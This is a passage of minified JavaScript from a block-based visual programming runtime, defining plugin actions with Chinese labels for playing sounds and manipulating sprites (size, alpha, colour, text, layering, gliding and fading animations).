                    input: "string",
                    default: "abc"
                }, {
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["首次", "first"], ["末次", "last"]]
                }],
                fun: function (t, e, i) {
                    return "first" === i ? e.toString().indexOf(t.toString()) + 1 : e.toString().lastIndexOf(t.toString()) + 1;
                }
            },
            jli8Gwydoq: {
                visible: !1,
                fun: function () {
                    return Date.now();
                }
            },
            dOrvFfYuk6: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["年份", "year"], ["月份", "month"], ["日期", "day"], ["小时", "hour"], ["分钟", "minute"], ["秒数", "second"], ["毫秒", "miscsecond"], ["时间戳", "time"], ["星期数", "week"]]
                }],
                fun: function (t) {
                    var e = new Date();
                    switch (t) {
                        case "year":
                            return e.getFullYear();

                        case "month":
                            return e.getMonth() + 1;

                        case "day":
                            return e.getDate();

                        case "hour":
                            return e.getHours();

                        case "minute":
                            return e.getMinutes();

                        case "second":
                            return e.getSeconds();

                        case "miscsecond":
                            return e.getMilliseconds();

                        case "week":
                            return "星期" + ["日", "一", "二", "三", "四", "五", "六"][e.getDay()];

                        case "time":
                            return Date.now();
                    }
                }
            }
        }, _class$e = function (t) {
            function e(t) {
                return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
            }
            return inherits(e, t), createClass(e, [{
                key: "release",
                value: function () {
                    get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                }
            }]), e;
        }(LB.SDK.IPluginBase), _class$d = (_class$e.Instance = _class$f, _class$e.Action = Action$8,
            _class$e.Condition = Condition$7, _class$e.Expression = Expression$7, function (t) {
                function e(t) {
                    return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
                        t.renderer = t._runtime.renderer, t;
                }
                return inherits(e, t), createClass(e, [{
                    key: "release",
                    value: function () {
                        get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                    }
                }, {
                    key: "playSound",
                    value: function (t) {
                        t = this._runtime.runtimeData.checkAndGetSoundUrl(t, this.currentThread.target),
                            this.renderer.soundManager.playSound(t);
                    }
                }, {
                    key: "playMusic",
                    value: function (t, e) {
                        e = this._runtime.runtimeData.checkAndGetSoundUrl(e, this.currentThread.target),
                            this.renderer.soundManager.playBgm(e, "1" === t);
                    }
                }, {
                    key: "playBgm",
                    value: function (t) {
                        t = this._runtime.runtimeData.checkAndGetSoundUrl(t, this.currentThread.target),
                            this.renderer.soundManager.playSound(t, !0);
                    }
                }, {
                    key: "pauseSound",
                    value: function (t) {
                        t = this._runtime.runtimeData.checkAndGetSoundUrl(t, this.currentThread.target),
                            this.renderer.soundManager.pauseSound(t);
                    }
                }, {
                    key: "stopSound",
                    value: function (t) {
                        t = this._runtime.runtimeData.checkAndGetSoundUrl(t, this.currentThread.target),
                            this.renderer.soundManager.stopSound(t);
                    }
                }, {
                    key: "playSoundAndWait",
                    value: function () { }
                }, {
                    key: "stopAllSounds",
                    value: function (t) {
                        this.renderer.soundManager.stopAll();
                    }
                }, {
                    key: "currentThread",
                    get: function () {
                        return this._blockEngine.currentThread;
                    }
                }, {
                    key: "blockEngine",
                    get: function () {
                        return this._blockEngine;
                    }
                }]), e;
            }(LB.SDK.IPluginInstanceBase)), Action$7 = {
                Qnq8g5zBrP: {
                    args: [{
                        type: "list",
                        name: "OPTION_LIST",
                        options: LB.BlockHelper.getSoundList
                    }],
                    fun: function () {
                        this.playSound.apply(this, arguments);
                    }
                },
                Gy1Z8kGoSj: {
                    args: [{
                        type: "list",
                        name: "OPTION_LIST",
                        options: LB.BlockHelper.getSoundList
                    }],
                    fun: function () {
                        this.playBgm.apply(this, arguments);
                    }
                },
                X3ZRlsFuhs: {
                    args: [{
                        type: "list",
                        name: "OPTION_LIST1",
                        options: [["循环", "1"], ["不循环", "2"]]
                    }, {
                        type: "list",
                        name: "OPTION_LIST",
                        options: LB.BlockHelper.getSoundList
                    }],
                    fun: function () {
                        this.playMusic.apply(this, arguments);
                    }
                },
                mGcrgmqr5T: {
                    args: [{
                        type: "list",
                        name: "OPTION_LIST",
                        options: LB.BlockHelper.getSoundList
                    }],
                    fun: function () {
                        this.pauseSound.apply(this, arguments);
                    }
                },
                GZQJrs7GrX: {
                    args: [{
                        type: "list",
                        name: "OPTION_LIST",
                        options: LB.BlockHelper.getSoundList
                    }],
                    fun: function () {
                        this.stopSound.apply(this, arguments);
                    }
                },
                cdgwXyBLnY: {
                    fun: function () {
                        this.stopAllSounds.apply(this, arguments);
                    }
                }
            }, Condition$6 = {}, Expression$6 = {}, _class$c = function (t) {
                function e(t) {
                    return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
                }
                return inherits(e, t), createClass(e, [{
                    key: "release",
                    value: function () {
                        get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                    }
                }]), e;
            }(LB.SDK.IPluginBase), _class$b = (_class$c.Instance = _class$d, _class$c.Action = Action$7,
                _class$c.Condition = Condition$6, _class$c.Expression = Expression$6, function (t) {
                    function e(t) {
                        return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
                            t.renderer = t._runtime.renderer, t;
                    }
                    return inherits(e, t), createClass(e, [{
                        key: "release",
                        value: function () {
                            get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                        }
                    }, {
                        key: "getBatchList",
                        value: function (t, e) {
                            return (t = this._runtime.runtimeData.checkAndgetSpriteId({
                                str: t,
                                type: e,
                                thread: this.currentThread
                            })) ? LB.Util.isArray(t) ? t : [t] : [];
                        }
                    }, {
                        key: "setSpriteSize",
                        value: function (t, e, i) {
                            var n = this;
                            this.getBatchList(t).forEach(function (t) {
                                (t = n.renderer.getSpriteById(t)) && ("size" === e ? (t.changeSize("width", LB.Util.toNumber(i) * n._runtime.devicePixel),
                                    t.changeSize("height", LB.Util.toNumber(i) * n._runtime.devicePixel)) : t.changeSize(e, LB.Util.toNumber(i) * n._runtime.devicePixel));
                            });
                        }
                    }, {
                        key: "changeSpriteSize",
                        value: function (t, e, i) {
                            var n = this, s = 3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : "+", t = this.getBatchList(t), r = LB.Util.toNumber(i);
                            "-" === s && (r = -r), t.forEach(function (t) {
                                (t = n.renderer.getSpriteById(t)) && ("size" === e ? (t.changeSize("width", t.width + r * n._runtime.devicePixel),
                                    t.changeSize("height", t.height + r * n._runtime.devicePixel)) : t.changeSize(e, t[e] + r * n._runtime.devicePixel));
                            });
                        }
                    }, {
                        key: "setStyleFlip",
                        value: function (t, e) {
                            var n = this, s = "_justify_" === e ? "x" : "y";
                            this.getBatchList(t).forEach(function (t) {
                                var e = (t = n.renderer.getSpriteById(t)).scale, i = void 0, e = "x" == s ? (i = -e.x,
                                    e.y) : (i = e.x, -e.y);
                                t && t.setScale({
                                    x: i,
                                    y: e
                                });
                            });
                        }
                    }, {
                        key: "changeAlpha",
                        value: function (t) {
                            var i, n = this, e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : "+", s = arguments[2];
                            isNaN(Number(s)) || (i = LB.Util.toNumber(s), "-" === e && (i = -i), this.getBatchList(t).forEach(function (t) {
                                var t = n.renderer.getSpriteById(t), e = Math.min(1, Math.max(0, LB.Util.toNumber(t.alpha) + i));
                                t && t.setAlpha(e);
                            }));
                        }
                    }, {
                        key: "setAlpha",
                        value: function (t, e) {
                            var i = this;
                            isNaN(e) || this.getBatchList(t).forEach(function (t) {
                                (t = i.renderer.getSpriteById(t)) && t.setAlpha(e);
                            });
                        }
                    }, {
                        key: "show",
                        value: function (t) {
                            var e = this;
                            this.getBatchList(t).forEach(function (t) {
                                (t = e.renderer.getSpriteById(t)) && t.show();
                            });
                        }
                    }, {
                        key: "hide",
                        value: function (t) {
                            var e = this;
                            this.getBatchList(t).forEach(function (t) {
                                (t = e.renderer.getSpriteById(t)) && t.hide();
                            });
                        }
                    }, {
                        key: "setSize",
                        value: function (t, e) {
                            var n = this, s = LB.Util.toNumber(e) / 100;
                            this.getBatchList(t).forEach(function (t) {
                                var e = (i = (t = n.renderer.getSpriteById(t))._scale).x, i = i.y;
                                t && t.setScale({
                                    x: s * e,
                                    y: s * i
                                });
                            });
                        }
                    }, {
                        key: "setLayerZIndex",
                        value: function (t, n, s) {
                            var r = this;
                            0 != s && this.getBatchList(t).forEach(function (t) {
                                var e, i;
                                (t = r.renderer.getSpriteById(t)) && "background" != t.type && (e = t.parent.getChildIndex(t),
                                    i = t.parent.children.length, "1" === n ? e += parseInt(s) : e -= parseInt(s), -1 < e) && e < i && t.parent.setChildIndex(t, e);
                            });
                        }
                    }, {
                        key: "setZIndexLast",
                        value: function (t, i) {
                            var n = this;
                            this.getBatchList(t).forEach(function (t) {
                                var e;
                                (t = n.renderer.getSpriteById(t)) && "background" != t.type && (t.parent.getChildIndex(t),
                                    e = t.parent.children.length, t.parent.setChildIndex(t, "1" === i ? e - 1 : 0));
                            });
                        }
                    }, {
                        key: "changeSize",
                        value: function (t) {
                            var n, s = this, e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : "+", i = arguments[2];
                            isNaN(Number(i)) || (n = LB.Util.toNumber(i) / 100, "-" === e && (n = -n), this.getBatchList(t).forEach(function (t) {
                                var e = (i = (t = s.renderer.getSpriteById(t)).scale).x, i = i.y;
                                t && t.setScale({
                                    x: e * (1 + n),
                                    y: i * (1 + n)
                                });
                            }));
                        }
                    }, {
                        key: "setFrame",
                        value: function (t, e) {
                            var i = this;
                            this.getBatchList(t).forEach(function (t) {
                                (t = i.renderer.getSpriteById(t)) && t.setFrame(+e);
                            });
                        }
                    }, {
                        key: "switchStyle",
                        value: function (t, e, a) {
                            var o = this, l = e;
                            this.getBatchList(t).forEach(function (t) {
                                var e = (t = o._runtime.runtimeData.getSpriteById(t)).id, i = t.name, n = void 0 === (n = t.styles) ? [] : n, s = t.animationId, r = t.renderer;
                                if (s && (window.cancelAnimationFrame(s), t.animationId = null), !n.includes(l)) throw new LB.ErrorHelper.CallBlockException(e, i, "造型不存在");
                                t.currentStyle = l, r.switchStyle(l, a);
                            });
                        }
                    }, {
                        key: "setStyleByUrl",
                        value: function (t, e) {
                            var n, s = this;
                            e ? (n = this.currentThread.peekStackFrame()).timer ? n.done ? n.result && this.getBatchList(t).forEach(function (t) {
                                var e = (t = s._runtime.runtimeData.getSpriteById(t)).animationId, i = t.renderer;
                                e && (window.cancelAnimationFrame(e), t.animationId = null), i.setSptiteTexture(n.result);
                            }) : this.currentThread.setYieldStatus() : (n.timer = Date.now(), this._loadImage(e, function (t) {
                                n.result = t, n.done = !0;
                            }), this.currentThread.setYieldStatus()) : console.log("url不能为空");
                        }
                    }, {
                        key: "_loadImage",
                        value: function (t, e) {
                            var i = new Image();
                            i.src = t, i.crossOrigin = "anonymous", i.onload = function () {
                                e(i);
                            }, i.onerror = function () {
                                e(null);
                            };
                        }
                    }, {
                        key: "switchStyleByIndex",
                        value: function (t, e, a) {
                            var o = this, l = LB.Util.toNumber(e) - 1;
                            this.getBatchList(t).forEach(function (t) {
                                var e = (t = o._runtime.runtimeData.getSpriteById(t)).id, i = t.name, n = void 0 === (n = t.styles) ? [] : n, s = t.animationId, r = t.renderer;
                                if (s && (window.cancelAnimationFrame(s), t.animationId = null), !n[l]) throw new LB.ErrorHelper.CallBlockException(e, i, "造型不存在");
                                t.currentStyle = n[l], r.switchStyle(n[l], a);
                            });
                        }
                    }, {
                        key: "switchBackgroundStyle",
                        value: function (t) {
                            var e = this._runtime.runtimeData.currentScene.background;
                            e.currentStyle !== t && (this._runtime.runtimeData.getSpriteById(e.id).currentStyle = t,
                                this.renderer.getSpriteById(e.id).switchStyle(t));
                        }
                    }, {
                        key: "setNumber",
                        value: function (t, e) {
                            var i = this, n = LB.Util.toNumber(e);
                            this.getBatchList(t, "variable").forEach(function (t) {
                                (t = i.renderer.getSpriteById(t)) && t.setValue(n);
                            });
                        }
                    }, {
                        key: "addNumber",
                        value: function (t) {
                            var e, i = this, n = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : "+", s = arguments[2];
                            isNaN(Number(s)) || (e = "-" === n ? 0 - s : s, this.getBatchList(t, "variable").forEach(function (t) {
                                (t = i.renderer.getSpriteById(t)) && t.addValue(e);
                            }));
                        }
                    }, {
                        key: "setText",
                        value: function (t, e) {
                            var i = this;
                            if (null == e) return !1;
                            var n = e;
                            e.value ? n = e.value.join() : "object" === (void 0 === e ? "undefined" : _typeof$1(e)) && (n = JSON.stringify(n)),
                                this.getBatchList(t, "text").forEach(function (t) {
                                    (t = i.renderer.getSpriteById(t)) && t.setText(n);
                                });
                        }
                    }, {
                        key: "setColor",
                        value: function (t, e, i) {
                            var n = this;
                            if (!i) return !1;
                            var s = +i.replace("#", "0x");
                            this.getBatchList(t).forEach(function (t) {
                                (t = n.renderer.getSpriteById(t)) && t.setColor(s, "text" === e);
                            });
                        }
                    }, {
                        key: "setColorByRGB",
                        value: function (t, e, i, n, s) {
                            var r = this, a = rgbToHex(Number(i), Number(n), Number(s));
                            this.getBatchList(t).forEach(function (t) {
                                (t = r.renderer.getSpriteById(t)) && t.setColor(a, "text" === e);
                            });
                        }
                    }, {
                        key: "showDialog",
                        value: function (t, e) {
                            var i = this, e = LB.Util.toNumber(e);
                            this.renderer.ui.dialog.show(t), e && 0 < e && setTimeout(function () {
                                i.renderer.ui.dialog.hide();
                            }, 1e3 * e);
                        }
                    }, {
                        key: "closeDialog",
                        value: function () {
                            this.renderer.ui.dialog.hide();
                        }
                    }, {
                        key: "getTextSpriteContent",
                        value: function (t) {
                            var e = this, t = this._runtime.runtimeData.checkAndgetSpriteId({
                                str: t,
                                type: "text",
                                thread: this.currentThread
                            }), i = [];
                            return LB.Util.isArray(t) ? (t.forEach(function (t) {
                                t = e.renderer.getSpriteById(t), i.push(t.getText());
                            }), i) : this.renderer.getSpriteById(t).getText();
                        }
                    }, {
                        key: "currentThread",
                        get: function () {
                            return this._blockEngine.currentThread;
                        }
                    }, {
                        key: "blockEngine",
                        get: function () {
                            return this._blockEngine;
                        }
                    }]), e;
                }(LB.SDK.IPluginInstanceBase));

function rgbToHex(t, e, i) {
    return "0x" + ((1 << 24) + (t << 16) + (e << 8) + i).toString(16).slice(1);
}

var Action$6 = {
    XWzwbnDz9t: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }],
        fun: function () {
            this.show.apply(this, arguments);
        }
    },
    ugVdNPh9BT: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }],
        fun: function () {
            this.hide.apply(this, arguments);
        }
    },
    mKOPebyB90: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            clear: "OPTION_LIST",
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getStyleList,
            args: "OPTION_LIST1"
        }, {
            type: "list",
            name: "OPTION_LIST2",
            options: [["不更新尺寸", "1"], ["更新尺寸", "2"]]
        }],
        fun: function () {
            this.switchStyle.apply(this, arguments);
        }
    },
    DAeKJl8aje: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "input",
            name: "NUM",
            input: "w_number",
            default: 1
        }, {
            type: "list",
            name: "OPTION_LIST2",
            options: [["不更新尺寸", "1"], ["更新尺寸", "2"]]
        }],
        fun: function () {
            this.switchStyleByIndex.apply(this, arguments);
        }
    },
    aRqmxIHJ9C: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: [["水平", "_justify_"], ["垂直", "_align_"]]
        }],
        fun: function () {
            this.setStyleFlip.apply(this, arguments);
        }
    },
    TPu6zP7UKu: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "input",
            name: "url",
            input: "string",
            default: "https://test.com/image.png"
        }],
        fun: function () {
            this.setStyleByUrl.apply(this, arguments);
        }
    },
    JcZNqb0pA4: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "input",
            name: "NUM",
            input: "w_number",
            default: "1"
        }],
        fun: function () {
            this.setFrame.apply(this, arguments);
        }
    },
    yRwngbLN5B: {
        visible: !1,
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getBackgroundStyleList
        }],
        fun: function () {
            this.switchBackgroundStyle.apply(this, arguments);
        }
    },
    btjATmos0y: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: [["宽度", "width"], ["高度", "height"], ["宽高", "size"]]
        }, {
            type: "input",
            name: "SIZE",
            input: "p_number",
            default: 100
        }],
        fun: function () {
            this.setSpriteSize.apply(this, arguments);
        }
    },
    BxW6AqmDVc: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: [["宽度", "width"], ["高度", "height"], ["宽高", "size"]]
        }, {
            type: "input",
            name: "SIZE",
            input: "p_number",
            default: 10
        }, {
            type: "list",
            name: "OPERATE",
            options: [["增加", "+"], ["减少", "-"]]
        }],
        fun: function () {
            this.changeSpriteSize.apply(this, arguments);
        }
    },
    HQBbdsgKi3: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "input",
            name: "SIZE",
            input: "p_number",
            default: 50
        }],
        fun: function () {
            this.setSize.apply(this, arguments);
        }
    },
    Tpe8x5p2pO: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "list",
            name: "OPERATE",
            options: [["增加", "+"], ["减少", "-"]]
        }, {
            type: "input",
            name: "CHANGE",
            input: "number",
            default: 20
        }],
        fun: function () {
            this.changeSize.apply(this, arguments);
        }
    },
    wUkQOoVkrB: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "input",
            name: "SECS",
            input: "number",
            default: .5
        }],
        fun: function () {
            this.setAlpha.apply(this, arguments);
        }
    },
    xr40P4lCmN: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "list",
            name: "OPERATE",
            options: [["增加", "+"], ["减少", "-"]]
        }, {
            type: "input",
            name: "CHANGE",
            input: "number",
            default: .1
        }],
        fun: function () {
            this.changeAlpha.apply(this, arguments);
        }
    },
    pePqmV8IlK: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "list",
            name: "TYPE",
            options: LB.BlockHelper.getSpritesColor
        }, {
            type: "input",
            name: "COLOR",
            input: "color"
        }],
        fun: function () {
            this.setColor.apply(this, arguments);
        }
    },
    xJXALu5cix: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithoutContainer,
            isTarget: !0
        }, {
            type: "list",
            name: "TYPE",
            options: LB.BlockHelper.getSpritesColor
        }, {
            type: "input",
            name: "R",
            input: "w_number",
            default: 255
        }, {
            type: "input",
            name: "G",
            input: "w_number",
            default: 0
        }, {
            type: "input",
            name: "B",
            input: "w_number",
            default: 0
        }],
        fun: function () {
            this.setColorByRGB.apply(this, arguments);
        }
    },
    brUEXyKhU8: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getNumberSpritesList,
            isTarget: !0
        }, {
            type: "input",
            name: "VARIABLE_SET",
            input: "number",
            default: 0
        }],
        fun: function () {
            this.setNumber.apply(this, arguments);
        }
    },
    IR55QBu7wz: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getNumberSpritesList,
            isTarget: !0
        }, {
            type: "list",
            name: "OPERATE",
            options: [["增加", "+"], ["减少", "-"]]
        }, {
            type: "input",
            name: "VARIABLE_SET",
            input: "number",
            default: 1
        }],
        fun: function () {
            this.addNumber.apply(this, arguments);
        }
    },
    RK4LWOqZPf: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getTextSpritesList,
            isTarget: !0
        }, {
            type: "input",
            name: "TEXT_SET",
            input: "string",
            default: "你好"
        }],
        fun: function () {
            this.setText.apply(this, arguments);
        }
    },
    mpqAix5uPq: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST1",
            options: [["上移", "1"], ["下移", "2"]]
        }, {
            type: "input",
            name: "TEXT_SET",
            input: "number",
            default: 1
        }],
        fun: function () {
            this.setLayerZIndex.apply(this, arguments);
        }
    },
    HiJ2265Gms: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST1",
            options: [["最上层", "1"], ["最下层", "2"]]
        }],
        fun: function () {
            this.setZIndexLast.apply(this, arguments);
        }
    },
    zpbFlbk4T5: {
        visible: !1,
        args: [{
            type: "input",
            name: "TEXT_SET",
            input: "string",
            default: "你好"
        }],
        fun: function () {
            this.showDialog.apply(this, arguments);
        }
    },
    sIgNMMmceR: {
        visible: !1,
        args: [{
            type: "input",
            name: "TEXT_SET",
            input: "string",
            default: "你好"
        }, {
            type: "input",
            name: "SECS",
            input: "p_number",
            default: 2
        }],
        fun: function () {
            this.showDialog.apply(this, arguments);
        }
    },
    uMSVczXwY1: {
        visible: !1,
        fun: function () {
            this.closeDialog.apply(this, arguments);
        }
    }
}, Condition$5 = {}, Expression$5 = {
    MhwMFyojyE: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getTextSpritesList,
            isTarget: !0
        }],
        fun: function () {
            return this.getTextSpriteContent.apply(this, arguments);
        }
    }
}, _class$a = function (t) {
    function e(t) {
        return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
    }
    return inherits(e, t), createClass(e, [{
        key: "release",
        value: function () {
            get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
        }
    }]), e;
}(LB.SDK.IPluginBase), _class$9 = (_class$a.Instance = _class$b, _class$a.Action = Action$6,
    _class$a.Condition = Condition$5, _class$a.Expression = Expression$5, function (t) {
        function e(t) {
            return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
                t.renderer = t._runtime.renderer, t;
        }
        return inherits(e, t), createClass(e, [{
            key: "release",
            value: function () {
                get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
            }
        }, {
            key: "getBatchList",
            value: function (t, e) {
                return (t = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: t,
                    type: e,
                    thread: this.currentThread
                })) ? LB.Util.isArray(t) ? t : [t] : [];
            }
        }, {
            key: "stopFrameAnimation",
            value: function (t) {
                var e = this;
                this.getBatchList(t).forEach(function (t) {
                    (t = e._runtime.runtimeData.getSpriteById(t)) && t.renderer.stopAnimation();
                });
            }
        }, {
            key: "playFrameAnimation",
            value: function (t, e, i, n) {
                if (!e.frames) throw new LB.ErrorHelper.CallBlockException(id, name, "造型不存在");
                e.setAnimationLoop(n), e.setAnimationTotalTime(i), e.startAnimation();
            }
        }, {
            key: "frameAnimation",
            value: function (t, e, i) {
                var n = this, s = "_loop_" === i, r = LB.Util.toNumber(1e3 * e);
                this.getBatchList(t).forEach(function (t) {
                    (t = n._runtime.runtimeData.getSpriteById(t)) && !t.animationId && n.playFrameAnimation(t, t.renderer, r, s);
                });
            }
        }, {
            key: "_glide",
            value: function (t, e, i) {
                var n, s, r = e.peekStackFrame();
                r.timer ? (n = r.timer.timeElapsed()) < 1e3 * r.duration ? (s = n / (1e3 * r.duration),
                    i.forEach(function (t) {
                        var e = s * (r.endX - t._glideStartX), i = s * (r.endY - t._glideStartY);
                        t.goTo(+t._glideStartX + e, +t._glideStartY + i);
                    }), e.setYieldStatus()) : i.forEach(function (t) {
                        t.goTo(r.endX, r.endY);
                    }) : (r.timer = new LB.Timer(), r.timer.start(), r.duration = LB.Util.toNumber(t.SECS),
                        i.forEach(function (t) {
                            t._glideStartX = t.getX(), t._glideStartY = t.getY();
                        }), r.endX = LB.Util.toNumber(t.X * this._runtime.devicePixel), r.endY = LB.Util.toNumber(t.Y * this._runtime.devicePixel),
                        r.duration <= 0 ? i.forEach(function (t) {
                            t.goTo(r.endX, r.endY);
                        }) : e.setYieldStatus());
            }
        }, {
            key: "glideToPosition",
            value: function (t, e, i) {
                var n, s = this;
                if (!(i = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: i,
                    thread: this.currentThread
                }))) return !1;
                LB.Util.isArray(i) && (i = i[0]), (i = this._getTargetXY(i)) && (t = this.getBatchList(t),
                    n = [], t.forEach(function (t) {
                        (t = s._runtime.runtimeData.getSpriteById(t)) && n.push(t.renderer);
                    }), this._glide({
                        SECS: e,
                        X: i[0],
                        Y: i[1]
                    }, this.currentThread, n));
            }
        }, {
            key: "glideToPositionByPos",
            value: function (t, e, i, n) {
                var s = this, t = this.getBatchList(t), r = [];
                t.forEach(function (t) {
                    (t = s._runtime.runtimeData.getSpriteById(t)) && r.push(t.renderer);
                }), this._glide({
                    SECS: e,
                    X: i,
                    Y: n
                }, this.currentThread, r);
            }
        }, {
            key: "_getTargetXY",
            value: function (t) {
                var e, i, n = 0, s = 0;
                return "_finger_" === t ? (i = (e = this._runtime.inputManager).mouseX, e = e.mouseY,
                    [i / this._runtime.devicePixel, e / this._runtime.devicePixel]) : ("_random_" === t ? (i = this.renderer.stageInfo.width,
                        e = this.renderer.stageInfo.height, n = Math.round(i * (Math.random() - .5)), s = Math.round(e * (Math.random() - .5))) : (i = this._runtime.runtimeData.getSpriteById(t)) && (n = (i.getX ? i : i.renderer).getX(),
                            s = (i.getY ? i : i.renderer).getY()), [n / this._runtime.devicePixel, s / this._runtime.devicePixel]);
            }
        }, {
            key: "fade",
            value: function (t, e, i) {
                var n = this, t = this.getBatchList(t), s = [];
                t.forEach(function (t) {
                    (t = n._runtime.runtimeData.getSpriteById(t)) && s.push(t.renderer);
                }), i < 0 ? i = 0 : 1 < i && (i = 1), this._alphaGlide(e, i, s);
            }
        }, {
            key: "scale",
            value: function (t, e, i, n) {
                var s = this, t = this.getBatchList(t), r = [];
                t.forEach(function (t) {
                    (t = s._runtime.runtimeData.getSpriteById(t)) && r.push(t.renderer);
                }), this._scaleGlide(e, i = i < 0 ? 0 : i, n = n < 0 ? 0 : n, r);
            }
        }, {
            key: "_scaleGlide",
            value: function (t, e, i, n) {
                var s, r, a = this.currentThread.peekStackFrame();
                a.timer ? (s = a.timer.timeElapsed()) < 1e3 * a.duration ? (r = s / (1e3 * a.duration),
                    n.forEach(function (t) {
                        var e = r * (a.endScaleX - t._startScaleX), i = r * (a.endScaleY - t._startScaleY);
                        t.setScale({
                            x: +t._startScaleX + e,
                            y: +t._startScaleY + i
                        });
                    }), this.currentThread.setYieldStatus()) : n.forEach(function (t) {
                        t.setScale({
                            x: e * t._scale.x,
                            y: i * t._scale.y
                        }), t._startScaleX = null, t._startScaleY = null;
                    }) : (a.timer = new LB.Timer(), a.timer.start(), a.duration = LB.Util.toNumber(t),
                        n.forEach(function (t) {
                            t._startScaleX = t.scale.x, t._startScaleY = t.scale.y, a.endScaleX = e * t._scale.x,
                                a.endScaleY = i * t._scale.y;
                        }), a.duration <= 0 ? n.forEach(function (t) {
                            t.setScale({
                                x: e,
                                y: i
                            }), t._startScaleX = null, t._startScaleY = null;
                        }) : this.currentThread.setYieldStatus());
            }
        }, {
            key: "fadeIn",
            value: function (t, e) {
                var i = this, t = this.getBatchList(t), n = [];
                t.forEach(function (t) {
                    (t = i._runtime.runtimeData.getSpriteById(t)) && n.push(t.renderer);
                }), this._alphaGlide(e, 1, n);
            }
        }, {
            key: "fadeOut",
            value: function (t, e) {
                var i = this, t = this.getBatchList(t), n = [];
                t.forEach(function (t) {
                    (t = i._runtime.runtimeData.getSpriteById(t)) && n.push(t.renderer);
                }), this._alphaGlide(e, 0, n);
            }
        }, {
            key: "_alphaGlide",
            value: function (t, e, i) {
                var n, s, r = this.currentThread.peekStackFrame();
                r.timer ? (n = r.timer.timeElapsed()) < 1e3 * r.duration ? (s = n / (1e3 * r.duration),
                    i.forEach(function (t) {
                        var e = s * (r.endAlpha - t._startAlpha);
                        t.setAlpha(+t._startAlpha + e);
                    }), this.currentThread.setYieldStatus()) : i.forEach(function (t) {
                        t.setAlpha(e), t._startAlpha = null;
                    }) : (r.timer = new LB.Timer(), r.timer.start(), r.duration = LB.Util.toNumber(t),
